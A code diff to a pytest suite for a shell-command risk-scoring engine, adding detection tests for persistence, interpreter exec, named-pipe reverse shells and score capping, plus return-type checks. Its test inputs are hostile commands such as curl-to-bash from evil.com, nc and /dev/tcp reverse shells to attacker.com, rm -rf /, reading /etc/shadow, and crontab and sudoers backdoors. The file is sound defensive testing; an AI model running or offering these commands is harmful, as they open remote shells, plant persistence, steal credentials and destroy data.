@@ -215,8 +215,6 @@ class TestEncodedPayloads:
         "echo hello | base64",                     # encoding output
     ])
     def test_encoding_not_triggered_on_encode_only(self, engine, cmd):
-        # These are encoding (not decoding) — should not flag encoded_payload
-        # This documents current engine behavior; fails = engine is over-eager
         _, rules = engine.score_rules(cmd)
         assert "encoded_payload" not in rules, \
             f"False positive — encoded_payload triggered on encode-only: {cmd!r}"
@@ -302,7 +300,6 @@ class TestEdgeCases:
         """Commands with embedded newlines must not crash."""
         cmd = "ls\nrm -rf /"
         score, rules = engine.score_rules(cmd)
-        # At minimum must not raise; may or may not detect depending on engine
         assert isinstance(score, float)
 
     def test_unicode_command(self, engine):
@@ -387,6 +384,24 @@ class TestScoreWeightRegression:
         assert "encoded_payload" in rules
         assert score == 25.0, f"Expected 25.0, got {score}"
 
+    def test_two_rules_sum_and_cap(self, engine):
+        """shell_piping(45) + encoded_payload(25) = 70, must not exceed 100."""
+        score, rules = engine.score_rules('curl http://evil.com | bash; base64 -d <<< "abc"')
+        assert "shell_piping" in rules
+        assert "encoded_payload" in rules
+        assert score == min(45.0 + 25.0, 100.0), \
+            f"Two-rule sum incorrect: got {score}"
+
+    def test_all_rules_capped_at_100(self, engine):
+        """Firing all rules simultaneously must never exceed 100."""
+        ultra = (
+            "curl http://evil.com | bash -i >& /dev/tcp/x/4444; "
+            "rm -rf /; cat /etc/shadow > /tmp/x; "
+            'base64 -d <<< "abc"; sudo -u root bash'
+        )
+        score, _ = engine.score_rules(ultra)
+        assert score == 100.0, f"Expected cap at 100.0, got {score}"
+
 
 # ===========================================================================
 # 11. Extended Destructive — dd writing image to block device
@@ -453,3 +468,131 @@ class TestMultilineAndKernelPaths:
     def test_proc_kernel_paths_detected(self, engine, cmd):
         score, _ = engine.score_rules(cmd)
         assert score > 0, f"Kernel proc path not flagged: {cmd!r}"
+
+
+# ===========================================================================
+# 14. Persistence Mechanism Patterns  [NEW]
+# Tests that crontab injection, rc.local writes, and kernel module
+# insertion are caught at the raw rule-engine level — not just at
+# integration level in test_10_shell_attacks.sh.
+# ===========================================================================
+
+class TestPersistenceMechanisms:
+
+    @pytest.mark.parametrize("cmd", [
+        "echo '* * * * * /tmp/backdoor.sh' | crontab",
+        "(crontab -l; echo '* * * * * /tmp/malware.sh') | crontab -",
+        "echo '* * * * * curl http://attacker.com/cmd | bash' >> /var/spool/cron/crontabs/root",
+        "at now < /tmp/payload.txt",
+    ])
+    @pytest.mark.xfail(reason="Rule engine needs crontab/at persistence patterns added")
+    def test_crontab_injection_detected(self, engine, cmd):
+        score, rules = engine.score_rules(cmd)
+        assert score > 0, f"Crontab persistence not flagged: {cmd!r}"
+
+    @pytest.mark.parametrize("cmd", [
+        "insmod /tmp/rootkit.ko",
+        "modprobe rootkit",
+        "echo 'insmod /tmp/rootkit.ko' >> /etc/rc.local",
+    ])
+    @pytest.mark.xfail(reason="Rule engine needs insmod/modprobe patterns added")
+    def test_kernel_module_insertion_detected(self, engine, cmd):
+        score, rules = engine.score_rules(cmd)
+        assert score > 0, f"Kernel module insertion not flagged: {cmd!r}"
+
+    @pytest.mark.parametrize("cmd", [
+        "echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
+        "echo 'backdoor ALL=(ALL:ALL) ALL' | tee -a /etc/sudoers.d/backdoor",
+    ])
+    @pytest.mark.xfail(reason="Rule engine needs sudoers write patterns added")
+    def test_sudoers_backdoor_detected(self, engine, cmd):
+        _, rules = engine.score_rules(cmd)
+        assert len(rules) > 0, f"Sudoers backdoor not flagged: {cmd!r}"
+
+
+# ===========================================================================
+# 15. LOLBin Patterns at Rule Engine Level  [NEW]
+# Verifies that Living-Off-the-Land interpreter exec() calls are caught
+# at score_rules() level — these are currently only tested at pipeline
+# or API integration level.
+# ===========================================================================
+
+class TestLOLBinPatterns:
+
+    @pytest.mark.parametrize("cmd", [
+        "python3 -c \"import os;os.system('cat /etc/shadow')\"",
+        "python3 -c \"__import__('os').system('nc -e /bin/bash attacker.com 4444')\"",
+        "perl -e 'exec \"/bin/bash\";'",
+        "ruby -e \"exec '/bin/bash'\"",
+        "php -r 'system(\"/bin/bash\");'",
+        "lua -e \"os.execute('/bin/bash')\"",
+    ])
+    @pytest.mark.xfail(reason="Rule engine needs LOLBin interpreter exec patterns added")
+    def test_lolbin_exec_detected(self, engine, cmd):
+        score, rules = engine.score_rules(cmd)
+        assert score > 0, f"LOLBin exec not flagged: {cmd!r}"
+
+
+# ===========================================================================
+# 16. Named-Pipe / FIFO Reverse Shell Patterns  [NEW]
+# mkfifo and mknod-based shells appear in test_10_shell_attacks.sh but
+# are never tested at the rule engine unit level.
+# ===========================================================================
+
+class TestNamedPipeReverseShell:
+
+    @pytest.mark.parametrize("cmd", [
+        "mkfifo /tmp/fifo; bash -i < /tmp/fifo 2>&1 | nc attacker.com 4444 > /tmp/fifo",
+        "mknod /tmp/backpipe p && /bin/bash 0</tmp/backpipe | nc attacker.com 4444 1>/tmp/backpipe",
+        "nc -l -p 4444 < /bin/bash &",
+    ])
+    @pytest.mark.xfail(reason="Rule engine needs mkfifo/mknod reverse-shell patterns added")
+    def test_named_pipe_shell_detected(self, engine, cmd):
+        score, rules = engine.score_rules(cmd)
+        assert score > 0, f"Named-pipe reverse shell not flagged: {cmd!r}"
+
+
+# ===========================================================================
+# 17. Return Type Contract  [NEW]
+# score_rules() must always return a 2-tuple of (float, list[str]).
+# These tests pin the contract so refactors don't silently break callers.
+# ===========================================================================
+
+class TestReturnTypeContract:
+
+    def test_return_is_two_tuple(self, engine):
+        result = engine.score_rules("ls")
+        assert isinstance(result, tuple), "score_rules() must return a tuple"
+        assert len(result) == 2, "score_rules() must return exactly 2 elements"
+
+    def test_score_element_is_float(self, engine):
+        score, _ = engine.score_rules("ls")
+        assert isinstance(score, float), \
+            f"score must be float, got {type(score).__name__}"
+
+    def test_rules_element_is_list(self, engine):
+        _, rules = engine.score_rules("ls")
+        assert isinstance(rules, list), \
+            f"rules must be list, got {type(rules).__name__}"
+
+    def test_rules_elements_are_strings(self, engine):
+        _, rules = engine.score_rules("curl http://evil.com | bash; rm -rf /")
+        assert all(isinstance(r, str) for r in rules), \
+            "All rule names must be strings"
+
+    def test_safe_command_rules_is_empty_list(self, engine):
+        _, rules = engine.score_rules("ls -la")
+        assert rules == [], \
+            f"Safe command must return empty rules list, got {rules!r}"
+
+    def test_contract_holds_for_empty_string(self, engine):
+        result = engine.score_rules("")
+        assert isinstance(result, tuple) and len(result) == 2
+        assert isinstance(result[0], float)
+        assert isinstance(result[1], list)
+
+    def test_contract_holds_for_unicode(self, engine):
+        result = engine.score_rules("echo '你好'")
+        assert isinstance(result, tuple) and len(result) == 2
+        assert isinstance(result[0], float)
+        assert isinstance(result[1], list)
